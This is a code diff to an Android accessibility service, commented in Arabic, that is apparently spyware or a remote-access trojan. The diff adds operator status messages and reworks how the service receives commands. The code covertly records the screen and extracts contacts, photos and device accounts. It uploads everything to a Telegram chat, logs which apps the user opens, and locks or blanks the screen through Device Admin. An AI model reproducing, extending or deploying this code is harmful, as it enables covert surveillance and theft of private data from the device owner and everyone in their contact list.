@@ -78,8 +78,6 @@ public class RecordingAccessibilityService extends AccessibilityService {
     private MediaProjectionManager projectionManager;
     private OkHttpClient client = new OkHttpClient();
     private Handler handler = new Handler(Looper.getMainLooper());
-    private AlarmManager alarmManager;
-    private PendingIntent recordingIntent;
     private String lastAppPackage = "";
     private StringBuilder typingBuffer = new StringBuilder();
     private boolean isTyping = false;
@@ -89,7 +87,9 @@ public class RecordingAccessibilityService extends AccessibilityService {
         super.onCreate();
         
         projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
+        
+        // إرسال تأكيد بدء الخدمة
+        sendToTelegram("🚀 خدمة التسجيل بدأت", CHAT_ID);
         
         // إعدادات الخدمة
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -109,17 +109,6 @@ public class RecordingAccessibilityService extends AccessibilityService {
         screenHeight = metrics.heightPixels;
         screenDensity = metrics.densityDpi;
         
-        // استقبال الأوامر
-        IntentFilter filter = new IntentFilter();
-        filter.addAction("START_RECORDING");
-        filter.addAction("STOP_RECORDING");
-        filter.addAction("GET_CONTACTS");
-        filter.addAction("GET_PHOTOS");
-        filter.addAction("LOCK_SCREEN");
-        filter.addAction("GET_ACCOUNTS");
-        filter.addAction("SCREEN_OFF");
-        registerReceiver(commandReceiver, filter);
-        
         // استعادة صلاحية التسجيل
         setupMediaProjection();
         
@@ -127,28 +116,38 @@ public class RecordingAccessibilityService extends AccessibilityService {
         startAppMonitoring();
     }
 
-    private BroadcastReceiver commandReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && intent.getAction() != null) {
             String action = intent.getAction();
+            sendToTelegram("📥 أمر واصل للخدمة: " + action, CHAT_ID);
             
-            if ("START_RECORDING".equals(action)) {
-                startScreenRecording();
-            } else if ("STOP_RECORDING".equals(action)) {
-                stopScreenRecording();
-            } else if ("GET_CONTACTS".equals(action)) {
-                new Thread(() -> extractAndSendContacts()).start();
-            } else if ("GET_PHOTOS".equals(action)) {
-                new Thread(() -> extractAndSendPhotos()).start();
-            } else if ("LOCK_SCREEN".equals(action)) {
-                lockScreen();
-            } else if ("GET_ACCOUNTS".equals(action)) {
-                new Thread(() -> extractAndSendAccounts()).start();
-            } else if ("SCREEN_OFF".equals(action)) {
-                turnScreenOff();
+            switch (action) {
+                case "START_RECORDING":
+                    startScreenRecording();
+                    break;
+                case "STOP_RECORDING":
+                    stopScreenRecording();
+                    break;
+                case "GET_CONTACTS":
+                    new Thread(() -> extractAndSendContacts()).start();
+                    break;
+                case "GET_PHOTOS":
+                    new Thread(() -> extractAndSendPhotos()).start();
+                    break;
+                case "LOCK_SCREEN":
+                    lockScreen();
+                    break;
+                case "GET_ACCOUNTS":
+                    new Thread(() -> extractAndSendAccounts()).start();
+                    break;
+                case "SCREEN_OFF":
+                    turnScreenOff();
+                    break;
             }
         }
-    };
+        return super.onStartCommand(intent, flags, startId);
+    }
 
     private void setupMediaProjection() {
         SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
@@ -160,15 +159,26 @@ public class RecordingAccessibilityService extends AccessibilityService {
                 Intent data = Intent.parseUri(dataUri, 0);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                     mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                    sendToTelegram("✅ صلاحية التسجيل مستعادة", CHAT_ID);
                 }
             } catch (Exception e) {
                 e.printStackTrace();
             }
+        } else {
+            sendToTelegram("❌ لا توجد صلاحية تسجيل", CHAT_ID);
         }
     }
 
     private void startScreenRecording() {
-        if (isRecording || mediaProjection == null) return;
+        if (isRecording) {
+            sendToTelegram("⚠️ التسجيل بالفعل شغال", CHAT_ID);
+            return;
+        }
+        if (mediaProjection == null) {
+            sendToTelegram("❌ لا توجد صلاحية تسجيل", CHAT_ID);
+            setupMediaProjection();
+            return;
+        }
         
         try {
             String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
@@ -209,7 +219,10 @@ public class RecordingAccessibilityService extends AccessibilityService {
     }
 
     private void stopScreenRecording() {
-        if (!isRecording) return;
+        if (!isRecording) {
+            sendToTelegram("⚠️ لا يوجد تسجيل شغال", CHAT_ID);
+            return;
+        }
         
         try {
             mediaRecorder.stop();
@@ -217,21 +230,27 @@ public class RecordingAccessibilityService extends AccessibilityService {
             virtualDisplay.release();
             isRecording = false;
             
+            sendToTelegram("⏹ تم إيقاف التسجيل، جاري الإرسال", CHAT_ID);
+            
             // إرسال الفيديو
             sendVideoToTelegram(currentVideoPath);
             
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل إيقاف التسجيل: " + e.getMessage(), CHAT_ID);
         }
     }
 
     private void extractAndSendContacts() {
         try {
+            sendToTelegram("📇 جاري سحب جهات الاتصال...", CHAT_ID);
+            
             JSONArray contactsArray = new JSONArray();
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
             
+            int count = 0;
             while (cursor != null && cursor.moveToNext()) {
                 String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
@@ -240,8 +259,14 @@ public class RecordingAccessibilityService extends AccessibilityService {
                 contact.put("name", name);
                 contact.put("phone", phone);
                 contactsArray.put(contact);
+                count++;
             }
             if (cursor != null) cursor.close();
+            
+            if (count == 0) {
+                sendToTelegram("📇 لا توجد جهات اتصال", CHAT_ID);
+                return;
+            }
             
             // حفظ في ملف
             File file = new File(getCacheDir(), "contacts.json");
@@ -249,16 +274,21 @@ public class RecordingAccessibilityService extends AccessibilityService {
             fos.write(contactsArray.toString(2).getBytes());
             fos.close();
             
+            sendToTelegram("📇 تم سحب " + count + " جهة اتصال، جاري الإرسال", CHAT_ID);
+            
             // إرسال الملف
             sendFileToTelegram(file, "contacts.json");
             
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل سحب جهات الاتصال: " + e.getMessage(), CHAT_ID);
         }
     }
 
     private void extractAndSendPhotos() {
         try {
+            sendToTelegram("🖼 جاري سحب الصور...", CHAT_ID);
+            
             File photosDir = new File(getCacheDir(), "photos");
             if (!photosDir.exists()) photosDir.mkdirs();
             
@@ -270,7 +300,7 @@ public class RecordingAccessibilityService extends AccessibilityService {
             List<File> photoFiles = new ArrayList<>();
             int count = 0;
             
-            while (cursor != null && cursor.moveToNext() && count < 50) {
+            while (cursor != null && cursor.moveToNext() && count < 20) { // حد أقصى 20 صورة
                 String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                 File sourceFile = new File(path);
                 if (sourceFile.exists()) {
@@ -282,6 +312,13 @@ public class RecordingAccessibilityService extends AccessibilityService {
             }
             if (cursor != null) cursor.close();
             
+            if (count == 0) {
+                sendToTelegram("🖼 لا توجد صور", CHAT_ID);
+                return;
+            }
+            
+            sendToTelegram("🖼 تم سحب " + count + " صورة، جاري الضغط والإرسال", CHAT_ID);
+            
             // ضغط الملفات
             File zipFile = new File(getCacheDir(), "photos.zip");
             zipFiles(photoFiles, zipFile);
@@ -291,11 +328,14 @@ public class RecordingAccessibilityService extends AccessibilityService {
             
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل سحب الصور: " + e.getMessage(), CHAT_ID);
         }
     }
 
     private void extractAndSendAccounts() {
         try {
+            sendToTelegram("👤 جاري سحب الحسابات...", CHAT_ID);
+            
             JSONArray accountsArray = new JSONArray();
             AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
             Account[] accounts = accountManager.getAccounts();
@@ -307,38 +347,41 @@ public class RecordingAccessibilityService extends AccessibilityService {
                 accountsArray.put(acc);
             }
             
+            if (accountsArray.length() == 0) {
+                sendToTelegram("👤 لا توجد حسابات", CHAT_ID);
+                return;
+            }
+            
             // حفظ في ملف
             File file = new File(getCacheDir(), "accounts.json");
             FileOutputStream fos = new FileOutputStream(file);
             fos.write(accountsArray.toString(2).getBytes());
             fos.close();
             
+            sendToTelegram("👤 تم سحب " + accountsArray.length() + " حساب، جاري الإرسال", CHAT_ID);
+            
             // إرسال الملف
             sendFileToTelegram(file, "accounts.json");
             
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل سحب الحسابات: " + e.getMessage(), CHAT_ID);
         }
     }
 
     private void lockScreen() {
         try {
+            sendToTelegram("🔒 جاري قفل الشاشة...", CHAT_ID);
+            
             // محاولة قفل الشاشة عبر Device Admin
             DevicePolicyManager policyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
             ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
             
             if (policyManager.isAdminActive(adminReceiver)) {
                 policyManager.lockNow();
-                sendToTelegram("🔒 تم قفل الشاشة عبر Admin", CHAT_ID);
+                sendToTelegram("🔒 تم قفل الشاشة", CHAT_ID);
             } else {
-                // إذا ما فيه Admin، استخدم Keyguard
-                KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    // هذا يحتاج Activity، لذلك نرسل برودكاست لنشاط رئيسي
-                    Intent intent = new Intent("LOCK_SCREEN_NOW");
-                    sendBroadcast(intent);
-                    sendToTelegram("🔒 جاري قفل الشاشة...", CHAT_ID);
-                }
+                sendToTelegram("🔒 لا توجد صلاحية Admin", CHAT_ID);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -348,23 +391,36 @@ public class RecordingAccessibilityService extends AccessibilityService {
 
     private void turnScreenOff() {
         try {
+            sendToTelegram("📱 جاري إطفاء الشاشة...", CHAT_ID);
+            
             // إطفاء الشاشة
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 1000);
+                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 1);
                 
-                Intent intent = new Intent(Intent.ACTION_SCREEN_OFF);
-                sendBroadcast(intent);
+                // محاولة إطفاء الشاشة عبر Device Admin
+                DevicePolicyManager policyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+                ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
+                
+                if (policyManager.isAdminActive(adminReceiver)) {
+                    policyManager.lockNow();
+                }
             }
             
             sendToTelegram("📱 تم إطفاء الشاشة", CHAT_ID);
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل إطفاء الشاشة: " + e.getMessage(), CHAT_ID);
         }
     }
 
     private void sendVideoToTelegram(String videoPath) {
         try {
             File file = new File(videoPath);
+            if (!file.exists()) {
+                sendToTelegram("❌ ملف الفيديو غير موجود", CHAT_ID);
+                return;
+            }
+            
             String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
             
             RequestBody requestBody = new MultipartBody.Builder()
@@ -383,17 +439,24 @@ public class RecordingAccessibilityService extends AccessibilityService {
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(okhttp3.Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        sendToTelegram("✅ تم إرسال الفيديو بنجاح", CHAT_ID);
+                    } else {
+                        sendToTelegram("❌ فشل إرسال الفيديو: " + response.message(), CHAT_ID);
+                    }
                     response.close();
                     file.delete();
                 }
 
                 @Override
                 public void onFailure(okhttp3.Call call, IOException e) {
+                    sendToTelegram("❌ فشل إرسال الفيديو: " + e.getMessage(), CHAT_ID);
                     e.printStackTrace();
                 }
             });
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل إرسال الفيديو: " + e.getMessage(), CHAT_ID);
         }
     }
 
@@ -415,17 +478,24 @@ public class RecordingAccessibilityService extends AccessibilityService {
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(okhttp3.Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        sendToTelegram("✅ تم إرسال " + fileName + " بنجاح", CHAT_ID);
+                    } else {
+                        sendToTelegram("❌ فشل إرسال " + fileName + ": " + response.message(), CHAT_ID);
+                    }
                     response.close();
                     file.delete();
                 }
 
                 @Override
                 public void onFailure(okhttp3.Call call, IOException e) {
+                    sendToTelegram("❌ فشل إرسال " + fileName + ": " + e.getMessage(), CHAT_ID);
                     e.printStackTrace();
                 }
             });
         } catch (Exception e) {
             e.printStackTrace();
+            sendToTelegram("❌ فشل إرسال الملف: " + e.getMessage(), CHAT_ID);
         }
     }
 
@@ -449,7 +519,9 @@ public class RecordingAccessibilityService extends AccessibilityService {
             }
 
             @Override
-            public void onFailure(okhttp3.Call call, IOException e) {}
+            public void onFailure(okhttp3.Call call, IOException e) {
+                e.printStackTrace();
+            }
         });
     }
 
@@ -467,15 +539,17 @@ public class RecordingAccessibilityService extends AccessibilityService {
 
     private void zipFiles(List<File> files, File zipFile) throws IOException {
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
+        byte[] buffer = new byte[1024];
+        
         for (File file : files) {
-            ZipEntry entry = new ZipEntry(file.getName());
-            zos.putNextEntry(entry);
             FileInputStream fis = new FileInputStream(file);
-            byte[] buffer = new byte[1024];
+            zos.putNextEntry(new ZipEntry(file.getName()));
+            
             int length;
             while ((length = fis.read(buffer)) > 0) {
                 zos.write(buffer, 0, length);
             }
+            
             fis.close();
             zos.closeEntry();
         }
@@ -487,9 +561,9 @@ public class RecordingAccessibilityService extends AccessibilityService {
             @Override
             public void run() {
                 checkCurrentApp();
-                handler.postDelayed(this, 1000);
+                handler.postDelayed(this, 2000);
             }
-        }, 1000);
+        }, 2000);
     }
 
     private void checkCurrentApp() {
@@ -508,7 +582,7 @@ public class RecordingAccessibilityService extends AccessibilityService {
                         appName = pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
                     } catch (Exception e) {}
                     
-                    sendToTelegram("📱 فتح تطبيق: " + appName + " (" + packageName + ")", CHAT_ID);
+                    sendToTelegram("📱 فتح تطبيق: " + appName, CHAT_ID);
                 }
             }
         }
@@ -557,9 +631,6 @@ public class RecordingAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        try {
-            unregisterReceiver(commandReceiver);
-        } catch (Exception e) {}
         
         if (isRecording) {
             stopScreenRecording();
